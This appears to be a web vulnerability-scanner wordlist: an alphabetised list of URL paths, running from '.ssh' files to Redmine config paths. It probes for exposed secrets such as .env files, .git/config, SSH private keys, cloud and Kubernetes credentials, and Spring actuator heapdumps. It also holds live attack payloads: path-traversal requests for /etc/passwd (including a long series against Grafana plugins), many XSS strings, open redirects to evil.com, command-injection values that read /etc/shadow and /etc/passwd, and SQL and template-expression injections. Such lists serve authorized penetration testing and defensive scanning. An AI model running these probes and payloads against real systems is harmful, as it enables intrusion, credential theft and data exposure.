.ssh/id_rsa.pub
.ssh/known_hosts
/+CSCOE+/logon.html
/+CSCOT+/oem
/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua
/+CSCOT+/translation
/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/var/www/html/index.html
/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development
/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
/..%5c..%5c..%5c..%5c..%5cetc/passwd
/..%5c..%5c..%5c..%5cetc/passwd
/..%5c..%5c..%5cetc/passwd
/..%5c..%5cetc/passwd
/..%5cetc/passwd
/..;/examples/jsp/index.html
/..;/examples/servlets/index.html
/..;/examples/websocket/index.xhtml
/..;/manager/html
/./../../../../../../../../../../etc/passwd
/.appveyor.yml
/.axiom/accounts/do.json
/.azure-pipelines.yml
/.build.sh
/.bzr/branch/branch.conf
/.chef/config.rb
/.circleci/config.yml
/.circleci/ssh-config
/.composer-auth.json
/.composer/composer.json
/.config/gcloud/access_tokens.db
/.config/gcloud/configurations/config_default
/.config/gcloud/credentials.db
/.config/karma.conf.js
/.dbeaver/credentials-config.json
/.docker/config.json
/.dockercfg
/.dockerfile
/.Dockerfile
/.drone.yml
/.DS_Store
/.editorconfig
/.env
/.env.backup
/.env.dev
/.env.dev.local
/.env.development.local
/.env.example
/.env.live
/.env.local
/.env.old
/.env.prod
/.env.prod.local
/.env.production
/.env.production.local
/.env.save
/.env.stage
/.env.www
/.env_1
/.env_sample
/.esmtprc
/.ftpconfig
/.git
/.git-credentials
/.git/config
/.git/head
/.git/logs/HEAD
/.git/refs/heads
/.github/workflows/automerge.yml
/.github/workflows/build.yaml
/.github/workflows/build.yml
/.github/workflows/ci-daily.yml
/.github/workflows/ci-generated.yml
/.github/workflows/ci-issues.yml
/.github/workflows/ci-push.yml
/.github/workflows/ci.yaml
/.github/workflows/ci.yml
/.github/workflows/CI.yml
/.github/workflows/coverage.yml
/.github/workflows/dependabot.yml
/.github/workflows/deploy.yml
/.github/workflows/docker.yml
/.github/workflows/lint.yml
/.github/workflows/main.yaml
/.github/workflows/main.yml
/.github/workflows/pr.yml
/.github/workflows/publish.yml
/.github/workflows/push.yml
/.github/workflows/release.yaml
/.github/workflows/release.yml
/.github/workflows/smoosh-status.yml
/.github/workflows/snyk.yml
/.github/workflows/test.yaml
/.github/workflows/test.yml
/.github/workflows/tests.yaml
/.github/workflows/tests.yml
/.gitignore
/.hg/hgrc
/.htaccess
/.htpasswd
/.idea/dataSources.xml
/.idea/deployment.xml
/.idea/httpRequests/http-client.cookies
/.idea/httpRequests/http-requests-log.http
/.idea/workspace.xml
/.jenkins.sh
/.mailmap
/.msmtprc
/.netrc
/.npm/anonymous-cli-metrics.json
/.phpunit.result.cache
/.redmine
/.redmine-cli
/.settings/rules.json?auth=FIREBASE_SECRET
/.snyk
/.ssh/authorized_keys
/.ssh/id_dsa
/.ssh/id_rsa
/.ssh/known_hosts
/.ssh/known_hosts.old
/.styleci.yml
/.svn
/.svn/entries
/.svn/prop
/.svn/text
/.travis.sh
/.tugboat
/.user.ini
/.vscode/
/.well
/.well-known/matrix/client
/.well-known/matrix/server
/.well-known/openid-configuration
/.wget-hsts
/.wgetrc
/.wp-config.php.swp
/////evil.com
///evil.com/%2F..
//admin/
//anything/admin/
//evil.com/%2F..
//evil.com/..;/css
//secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=%3Cscript%3Ealert(1)%3C/script%3E&Search=Search
/1.sql
/404.php.bak
/?view=log
/?wsdl
/_/.ssh/authorized_keys
/___graphql
/__clockwork/app
/__swagger__/
/_cat/health
/_cat/indices
/_cluster/health
/_config.yml
/_darcs/prefs/binaries
/_debug_toolbar/
/_debugbar/open?max=20&offset=0
/_netrc
/_notes/dwsync.xml
/_profiler/empty/search/results?limit=10
/_profiler/phpinfo
/_profiler/phpinfo.php
/_something_.cfm
/_swagger_/
/_vti_bin/Authentication.asmx?op=Mode
/_vti_bin/lists.asmx?WSDL
/a/b/%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
/abs/
/access.log
/access/config
/access_tokens.db
/actions/seomatic/meta
/actuator
/actuator/auditevents
/actuator/auditLog
/actuator/beans
/actuator/caches
/actuator/conditions
/actuator/configprops
/actuator/configurationMetadata
/actuator/dump
/actuator/env
/actuator/events
/actuator/exportRegisteredServices
/actuator/favicon.ico
/actuator/features
/actuator/flyway
/actuator/healthcheck
/actuator/heapdump
/actuator/httptrace
/actuator/hystrix.stream
/actuator/integrationgraph
/actuator/jolokia
/actuator/liquibase
/actuator/logfile
/actuator/loggers
/actuator/loggingConfig
/actuator/management
/actuator/mappings
/actuator/metrics
/actuator/refresh
/actuator/registeredServices
/actuator/releaseAttributes
/actuator/resolveAttributes
/actuator/scheduledtasks
/actuator/sessions
/actuator/shutdown
/actuator/springWebflow
/actuator/sso
/actuator/ssoSessions
/actuator/statistics
/actuator/status
/actuator/threaddump
/actuator/trace
/actuators/
/actuators/dump
/actuators/env
/actuators/health
/actuators/logfile
/actuators/mappings
/actuators/shutdown
/actuators/trace
/adfs/ls/idpinitiatedsignon.aspx
/adfs/services/trust/2005/windowstransport
/adjuncts/3a890183/
/admin
/admin../admin
/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b2t382r1b342p37373b2s
/admin/
/Admin/
/admin/../admin
/admin//phpmyadmin/
/admin/adminer.php
/admin/configs/application.ini
/admin/data/autosuggest
/admin/error.log
/admin/errors.log
/admin/heapdump
/admin/index.php
/admin/init
/admin/log/error.log
/admin/login
/admin/login.html
/admin/login/?next=/admin/
/admin/logs/error.log
/admin/logs/errors.log
/admin/queues.jsp?QueueFilter=yu1ey%22%3e%3cscript%3ealert(%221%22)%3c%2fscript%3eqb68
/Admin/ServerSide/Telerik.Web.UI.DialogHandler.aspx?dp=1
/admin/views/ajax/autocomplete/user/a
/admin;/
/Admin;/
/adminadminer.php
/adminer.php
/adminer/
/adminer/adminer.php
/adminer/index.php
/ADSearch.cc?methodToCall=search
/aims/ps/
/airflow.cfg
/AirWatch/Login
/alps/profile
/altair
/analytics/saw.dll?bieehome&startPage=1#grabautologincookies
/analytics/saw.dll?getPreviewImage&previewFilePath=/etc/passwd
/anchor/errors.log
/android/app/google-services.json
/anonymous-cli-metrics.json
/ansible.cfg
/anything_here
/apache
/apache.conf
/apc.php
/apc/apc.php
/api
/api-docs
/api-docs/swagger.json
/api-docs/swagger.yaml
/api/
/api/.env
/api/__swagger__/
/api/_swagger_/
/api/api
/api/api-browser/
/api/api-docs
/api/api-docs/swagger.json
/api/api-docs/swagger.yaml
/api/apidocs
/api/apidocs/swagger.json
/api/apidocs/swagger.yaml
/api/application.wadl
/api/batch
/api/cask/graphql
/api/cask/graphql-playground
/api/config
/api/docs
/api/docs/
/api/graphql
/api/graphql/v1
/api/index.html
/api/jolokia/read<svgonload=alert(document.domain)>?mimeType=text/html
/api/jsonws
/api/jsonws/invoke
/api/profile
/api/proxy
/api/snapshots
/api/spec/swagger.json
/api/spec/swagger.yaml
/api/swagger
/api/swagger-resources
/api/swagger-resources/restservices/v2/api-docs
/api/swagger-ui.html
/api/swagger-ui/api-docs
/api/swagger-ui/swagger.json
/api/swagger-ui/swagger.yaml
/api/swagger.json
/api/swagger.yaml
/api/swagger.yml
/api/swagger/index.html
/api/swagger/static/index.html
/api/swagger/swagger
/api/swagger/swagger-ui.html
/api/swagger/ui/index
/api/swagger_doc.json
/api/timelion/run
/api/v1
/api/v1/
/api/v1/application.wadl
/api/v1/canal/config/1/1
/api/v1/namespaces
/api/v1/namespaces/default/pods
/api/v1/namespaces/default/secrets
/api/v1/namespaces/default/services
/api/v1/nodes
/api/v1/swagger-ui/swagger.json
/api/v1/swagger-ui/swagger.yaml
/api/v1/swagger.json
/api/v1/swagger.yaml
/api/v2
/api/v2/application.wadl
/api/v2/swagger.json
/api/v2/swagger.yaml
/api/vendor/phpunit/phpunit/phpunit
/api/whoami
/api_docs
/api_smartapp/storage/
/apis
/apis/apps/v1/namespaces/default/deployments
/aplicacao/application/configs/application.ini
/app/config/parameters.yml
/app/config/parameters.yml.dist
/app/config/pimcore/google-api-private-key.json
/app/config/security.yml
/app/etc/local.xml
/app/google-services.json
/app/kibana/
/app/settings.py
/App_Master/Telerik.Web.UI.DialogHandler.aspx?dp=1
/application.ini
/application.wadl
/application.wadl?detail=true
/application/configs/application.ini
/application/logs/access.log
/application/logs/application.log
/application/logs/default.log
/apps/vendor/phpunit/phpunit/phpunit
/appsettings.json
/appspec.yaml
/appspec.yml
/appveyor.yml
/asdf.php
/AsiCommon/Controls/ContentManagement/ContentDesigner/Telerik.Web.UI.DialogHandler.aspx?dp=1
/assets../.git/config
/assets/.gitignore
/assets/config.rb
/assets/credentials.json
/assets/file
/assets/other/service-account-credentials.json
/asynchPeople/
/auditevents
/aura
/auth.html
/auth/login
/auth/realms/master/.well-known/openid-configuration
/authorization.do
/autoconfig
/autodiscover/
/autoupdate/
/aws.sh
/awstats.conf
/awstats.pl
/awstats/
/axis/
/axis/happyaxis.jsp
/axis2-web/HappyAxis.jsp
/axis2/
/axis2/axis2-web/HappyAxis.jsp
/azure-pipelines.yml
/backend
/backup
/backup.sh
/backup.sql
/backup/vendor/phpunit/phpunit/phpunit
/base/static/c
/beans
/BitKeeper/etc/config
/blog/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0=
/blog/phpmyadmin/
/bower.json
/brightmail/servlet/com.ve.kavachart.servlet.ChartStream?sn=../../WEB
/bugs/verify.php?confirm_hash=&id=1
/build.sh
/bundles/kibana.style.css
/bundles/login.bundle.js
/cacti/
/certenroll/
/certprov/
/certsrv/
/cfcache.map
/CFIDE/administrator/images/background.jpg
/cfide/administrator/images/background.jpg
/CFIDE/administrator/images/componentutilslogin.jpg
/cfide/administrator/images/componentutilslogin.jpg
/CFIDE/administrator/images/mx_login.gif
/cfide/administrator/images/mx_login.gif
/cgi
/cgi-bin/nagios3/status.cgi
/cgi-bin/nagios4/status.cgi
/cgi-bin/printenv.pl
/cgi-bin/upload/web-ftp.cgi
/CGI/Java/Serviceability?adapter=device.statistics.configuration
/CgiStart?page=Single
/CHANGELOG.md
/ckeditor/samples/
/client_secrets.json
/cloud-config.yml
/cloudexp/application/configs/application.ini
/cloudfoundryapplication
/cluster/cluster
/cms/application/configs/application.ini
/cms/portlets/Telerik.Web.UI.DialogHandler.aspx?dp=1
/cobbler_api
/common/admin/Calendar/Telerik.Web.UI.DialogHandler.aspx?dp=1
/common/admin/Jobs2/Telerik.Web.UI.DialogHandler.aspx?dp=1
/common/admin/PhotoGallery2/Telerik.Web.UI.DialogHandler.aspx?dp=1
/compile.sh
/composer.json
/composer.lock
/conf/
/config.js
/config.php.bak
/config.rb
/config.sh
/config/
/config/configuration.yml
/config/database.yml
/config/databases.yml
/config/environment.rb
/config/error_log
/config/initializers/secret_token.rb
/config/jwt/private.pem
/config/packages/security.yaml
/config/postProcessing/testNaming?pattern=%3Csvg/onload=alert(document.domain)%3E
/config/properties.ini
/config/secrets.yml
/config/security.yml
/config/settings.yml
/config/storage.yml
/config/user.xml
/configprops
/configuration.php-dist
/configuration.yml
/configurations/config_default
/configure/app/landing/welcome-srm-va.html
/confluence
/conn.php.bak
/console
/console/login/LoginForm.jsp
/contact.php?theme=tes%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
/content../.git/config
/context.json
/control/login
/control/stream?contentId=<svg/onload=alert(1)>
/controller/config
/controller/registry
/controller/registry-clients
/core-cloud-config.yml
/core/config/databases.yml
/counters
/cp/Shares?user=&protocol=webaccess&v=2.3
/credentials.db
/credentials.json
/crossdomain.xml
/crowd/console/login.action
/crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow
/crx/de/index.jsp
/cs/idcplg?IdcService=GET_SEARCH_RESULTS&ResultTemplate=StandardResults&ResultCount=20&FromPageUrl=/cs/idcplg?IdcService=GET_DYNAMIC_PAGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\&PageName=indext&SortField=dInDate&SortOrder=Desc&ResultsTitle=AAA&dSecurityGroup=&QueryText=(dInDate+%3E=+%60%3C$dateCurrent(
/cs/idcplg?IdcService=GET_SEARCH_RESULTS&ResultTemplate=StandardResults&ResultCount=20&FromPageUrl=/cs/idcplg?IdcService=GET_DYNAMIC_PAGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\&PageName=indext&SortField=dInDate&SortOrder=Desc&ResultsTitle=XXXXXXXXXXXX%3Cscript%3Ealert(31337)%3C%2Fscript%3E&dSecurityGroup=&QueryText=(dInDate+%3E=+%60%3C$dateCurrent(
/css../.git/config
/CTCWebService/CTCWebServiceBean
/CTCWebService/CTCWebServiceBean?wsdl
/darkstat/
/dasbhoard/
/dashboard/
/dashboard/phpinfo.php
/dashboard/UserControl/CMS/Page/Telerik.Web.UI.DialogHandler.aspx/Desktopmodules/Admin/dnnWerk.Users/DialogHandler.aspx?dp=1
/data.sql
/data/adminer.php
/data/autosuggest
/data?get=prodServerGen
/database.php.bak
/database.sql
/database/schema.rb
/db.php.bak
/db.sql
/db/robomongo.json
/db/schema.rb
/db_backup.sql
/db_config.php.bak
/dbaas_monitor/login
/dbdump.sql
/debug
/debug.cgi
/debug.seam
/debug/default/view
/debug/default/view.html
/debug/pprof/
/debug/vars
/default.php.bak
/demo
/deploy.sh
/descriptorByName/AuditTrailPlugin/regexCheck?value=*j%3Ch1%3Esample
/desktop.ini
/DesktopModule/UIQuestionControls/UIAskQuestion/Telerik.Web.UI.DialogHandler.aspx?dp=1
/DesktopModules/Admin/RadEditorProvider/DialogHandler.aspx?dp=1
/desktopmodules/dnnwerk.radeditorprovider/dialoghandler.aspx?dp=1
/desktopmodules/telerikwebui/radeditorprovider/telerik.web.ui.dialoghandler.aspx?dp=1
/DesktopModules/TNComments/Telerik.Web.UI.DialogHandler.aspx?dp=1
/dev2local.sh
/development.log
/dfshealth.html
/dialin/
/dispatcher/invalidate.cache
/django/settings.py
/doc/page/login.asp
/doc/script/common.js
/docker-cloud.yml
/docker-compose-dev.yml
/docker-compose.dev.yml
/docker-compose.override.yml
/docker-compose.prod.yml
/docker-compose.production.yml
/docker-compose.staging.yml
/docker-compose.yml
/Dockerrun.aws.json
/docs
/docs/swagger.json
/domcfg.nsf
/download
/druid/coordinator/v1/leader
/druid/coordinator/v1/metadata/datasources
/druid/index.html
/druid/indexer/v1/taskStatus
/dump
/dump.sql
/dwr/index.html
/eam/vib?id=/etc/issue
/ecp/
/editor/ckeditor/samples/
/elfinder.html
/elmah.axd
/elocker_old/storage/
/email/unsubscribed?email=test@gmail.com%27\%22%3E%3Csvg/onload=alert(1337)%3E
/emergency.php
/env
/env.dev.js
/env.development.js
/env.js
/env.prod.js
/env.production.js
/env.sh
/env.test.js
/environment.rb
/equipbid/storage/
/error
/error.log
/error.txt
/error/error.log
/error_log
/error_log.txt
/errors.log
/errors.txt
/errors/errors.log
/errors_log
/etc
/etc/
/events../.git/config
/evil%E3%80%82com
/evil.com/
/evil.com//
/ews/
/examples/jsp/index.html
/examples/jsp/snp/snoop.jsp
/examples/servlets/index.html
/examples/websocket/index.xhtml
/exchange/
/exchweb/
/explore
/explorer
/express
/express-graphql
/extdirect
/favicon.ico
/fckeditor/_samples/default.html
/fetch
/filemanager/upload.php
/filezilla.xml
/FileZilla.xml
/filter/jmol/iframe.php?_USE=%22};alert(1337);//
/filter/jmol/js/jsmol/php/jsmol.php?call=getRawDataFromDatabase&query=file
/final/
/flow/registries
/footer.php.bak
/forum/phpmyadmin/
/frontend/web/debug/default/view
/ftpsync.settings
/fw.login.php
/fw.login.php?apikey=%27UNION%20select%201,%27YToyOntzOjM6InVpZCI7czo0OiItMTAwIjtzOjIyOiJBQ1RJVkVfRElSRUNUT1JZX0lOREVYIjtzOjE6IjEiO30=%27;
/gallery/zp
/Gemfile
/Gemfile.lock
/getcfg.php
/getFavicon?host=burpcollaborator.net
/global
/glpi/status.php
/glpi2/status.php
/google-api-private-key.json
/google-services.json
/gotoURL.asp?url=google.com&id=43569
/graph
/graph_cms
/graphiql
/graphiql.css
/graphiql.js
/graphiql.min.css
/graphiql.min.js
/graphiql.php
/graphiql/finland
/graphql
/graphql-console
/graphql-devtools
/graphql-explorer
/graphql-playground
/graphql-playground-html
/graphql.php
/graphql/console
/graphql/graphql
/graphql/graphql-playground
/graphql/schema.json
/graphql/schema.xml
/graphql/schema.yaml
/graphql/v1
/groovyconsole
/groupexpansion/
/Gruntfile.coffee
/Gruntfile.js
/guest/users/forgotten?email=%22%3E%3Cscript%3Econfirm(document.domain)%3C/script%3E
/happyaxis.jsp
/header.php.bak
/health
/healthz
/heapdump
/help/index.jsp?view=%3Cscript%3Ealert(document.cookie)%3C/script%3E
/home.html
/homepage.nsf
/hopfully404
/host.key
/hosts
/hsqldb%0a
/httpd.conf
/hybridconfig/
/HyperGraphQL
/hystrix.stream
/i.php
/id_dsa
/id_rsa
/IdentityGuardSelfService/
/IdentityGuardSelfService/images/favicon.ico
/images../.git/config
/images/favicon.ico
/img../.git/config
/IMS
/includes/.gitignore
/index.htm
/index.html
/index.jsp
/index.php
/index.php.bak
/index.php/admin/
/index.php?appservlang=%3Csvg%2Fonload=confirm%28%27xss%27%29%3E
/index.php?r=students/guardians/create&id=1%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
/index.php?redirect=//evil.com
/index.php?redirect=/\/evil.com/
/INF/maven/com.atlassian.jira/atlassian
/info.php
/info/
/infophp.php
/infos.php
/init.sh
/inormalydonotexist
/iNotes/Forms5.nsf
/iNotes/Forms6.nsf
/iNotes/Forms7.nsf
/iNotes/Forms8.nsf
/iNotes/Forms85.nsf
/iNotes/Forms9.nsf
/install
/install.php?profile=default
/install.sh
/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=%3b%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%20%23
/installer
/intikal/storage/
/invoker/EJBInvokerServlet/
/invoker/JMXInvokerServlet
/invoker/JMXInvokerServlet/
/ioncube/loader-wizard.php
/ipython/tree
/irj/portal
/iwc/idcStateError.iwc?page=javascript%3aalert(document.domain)%2f%2f
/jasperserver/login.html?error=1
/je/graphql
/jeecg-boot/
/jenkins/descriptorByName/AuditTrailPlugin/regexCheck?value=*j%3Ch1%3Esample
/jenkins/script
/jira/secure/Dashboard.jspa
/jkstatus
/jkstatus/
/jkstatus;
/jmx
/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fpoc
/jolokia
/jolokia/exec/ch.qos.logback.classic
/jolokia/list
/jolokia/read<svgonload=alert(document.domain)>?mimeType=text/html
/jolokia/version
/josso/%5C../invoker/EJBInvokerServlet/
/josso/%5C../invoker/JMXInvokerServlet/
/js../.git/config
/js/elfinder.min.js
/js/elFinder.version.js
/jsapi_ticket.json
/jsonapi/user/user
/jsp/help
/jwt/private.pem
/karma.conf.js
/key.pem
/keycloak.json
/kustomization.yml
/laravel
/laravel-graphql-playground
/lfm.php
/lib../.git/config
/lib/phpunit/phpunit/phpunit
/libraries/joomla/database/
/libs/granite/core/content/login/favicon.ico
/LICENSE.txt
/linusadmin-phpinfo.php
/linuxki/experimental/vis/kivis.php?type=kitrace&pid=0;echo%20START;cat%20/etc/passwd;echo%20END;
/loader-wizard.php
/loadtextfile.htm#programinfo
/local2dev.sh
/local2prod.sh
/localhost.key
/localhost.sql
/log.log
/log.txt
/log/access.log
/log/debug.log
/log/development.log
/log/error.log
/log/errors.log
/log/firewall.log
/log/mobile.log
/log/production.log
/log/system.log
/log/vpn.log
/log/warn.log
/log?type=%22%3C/script%3E%3Cscript%3Ealert(document.domain);%3C/script%3E%3Cscript%3E
/logfile
/loggers
/login
/login.jsp
/login.php
/login.php.bak
/Login?!><sVg/OnLoAD=alert`1337`//
/login?next=%2F
/logon/LogonPoint/custom.html
/logon/LogonPoint/index.html
/logs.txt
/logs/access.log
/logs/awstats.pl
/logs/development.log
/logs/error.log
/logs/errors.log
/logs/production.log
/lol/graphql
/magmi/web/js/magmi_utils.js
/mailsms/s?func=ADMIN:appState&dumpConfig=/
/main.php.bak
/management
/manager/html
/mantis/verify.php?id=1&confirm_hash=
/mantisBT/verify.php?id=1&confirm_hash=
/mappings
/mcx/
/mcx/mcxservice.svc
/meaweb/os/mxperson
/media../.git/config
/meet/
/meeting/
/message?title=x&msg=%26%23<svg/onload=alert(1337)>
/metrics
/mgmt/tm/sys/management
/mgmt/tm/sys/management-ip
/microsoft
/MicroStrategy/servlet/taskProc?taskId=shortURL&taskEnv=xml&taskContentType=xml&srcURL=https
/mifs/c/d/android.html
/mifs/login.jsp
/mifs/user/login.jsp
/mobile/error
/Modules/CMS/Telerik.Web.UI.DialogHandler.aspx?dp=1
/modules/system/assets/js/framework.combined-min.js
/modules/vendor/phpunit/phpunit/phpunit
/moto/application/configs/application.ini
/mrtg/
/MRTG/
/my.key
/my.ppk
/MyErrors.log
/mysql.initial.sql
/mysql.sql
/mysqlbackup.sh
/mysqldump.sql
/nagios/cgi-bin/status.cgi
/names.nsf/People?OpenView
/nbproject/project.properties
/nextcloud/index.php/login
/nginx.conf
/nginx_status
/ngrok2/ngrok.yml
/nifi-api/access/config
/node/1?_format=hal_json
/npm-debug.log
/npm-shrinkwrap.json
/nuxeo/login.jsp/pwn${31333333330+7}.xhtml
/OA_HTML/bin/sqlnet.log
/OA_HTML/jtfwrepo.xml
/oab/
/oauth-credentials.json
/oauth/token
/occ/v2/d2OzBcy
/ocsp/
/old/vendor/phpunit/phpunit/phpunit
/old_phpinfo.php
/oldsite/vendor/phpunit/phpunit/phpunit
/opcache
/opcache-status/
/opcache-status/opcache.php
/openapi.json
/Orion/Login.aspx
/os/mxperson
/ovirt-engine/
/owa/
/owa/auth/logon.aspx
/owncloud/config/
/package
/package-lock.json
/package.json
/pages
/pages/includes/status
/parameters.yml
/parameters.yml.dist
/Partners/application/configs/application.ini
/pdb/meta/v1/version
/PDC/ajaxreq.php?PARAM=127.0.0.1+
/perl
/perl-status
/persistentchat/
/phoneconferencing/
/php
/php-fpm.conf
/php-info.php
/php-opcache-status/
/php.ini
/php.php
/php/adminer.php
/php/phpmyadmin/
/php_info.php
/phpinfo.php
/phpmyadmin/
/phppgadmin/intro.php
/phpstan.neon
/phpunit.xml
/phpversion.php
/pimcore/app/config/pimcore/google-api-private-key.json
/pinfo.php
/playground
/plesk-stat/
/plugin/build
/plugins/servlet/gadgets/makeRequest?url=https
/plugins/servlet/gadgets/makeRequest?url=https://google.com
/plugins/servlet/oauth/users/icon
/plugins/servlet/svnwebclient/changedResource.jsp?url=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
/plugins/servlet/svnwebclient/commitGraph.jsp?%27)%3Balert(%22XSS
/plugins/servlet/svnwebclient/commitGraph.jsp?url=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
/plugins/servlet/svnwebclient/error.jsp?errormessage=%27%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&description=test
/plugins/servlet/svnwebclient/statsItem.jsp?url=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)
/PMUser/
/pods
/pools/default/buckets
/portal
/portal-graphql
/portal/favicon.ico
/portal/images/MyVue/MyVueHelp.png
/powershell/
/pprof
/private
/private-key
/private.pem
/privatekey.key
/prod2local.sh
/production.log
/profile
/proftpd.conf
/properties.ini
/provider.tf
/Providers/HtmlEditorProviders/Telerik/Telerik.Web.UI.DialogHandler.aspx?dp=1
/proxy
/proxy.stream?origin=http
/PRTG/index.htm
/prtg/index.htm
/prweb/PRRestService/unauthenticatedAPI/v1/docs
/public/
/public/adminer.php
/public/config.js
/public/plugins/alertGroups/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/alertmanager/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/annolist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/barchart/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/bargauge/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/canvas/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/cloudwatch/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/dashboard/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/dashlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/debug/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/elasticsearch/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/gauge/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/geomap/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/gettingstarted/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/grafana/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/graph/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/graphite/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/heatmap/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/histogram/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/icon/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/influxdb/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/jaeger/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/live/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/logs/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/loki/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/mixed/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/mssql/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/mysql/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/news/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/nodeGraph/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/opentsdb/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/piechart/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/pluginlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/postgres/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/prometheus/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/stat/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/state-timeline/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/status-history/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/table-old/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/table/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/tempo/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/testdata/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/text/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/timeseries/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/welcome/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/xychart/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/zipkin/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/publicadminer.php
/pyproject.toml
/query
/query-api
/query-explorer
/query-laravel
/radio/application/configs/application.ini
/rails/actions?error=ActiveRecord
/railsapp/config/storage.yml
/reach/sip.svc
/read_file
/readfile
/README.md
/readme.txt
/redmine/config/configuration.yml
/redmine/config/environment.rb
/redmine/config/initializers/secret_token.rb
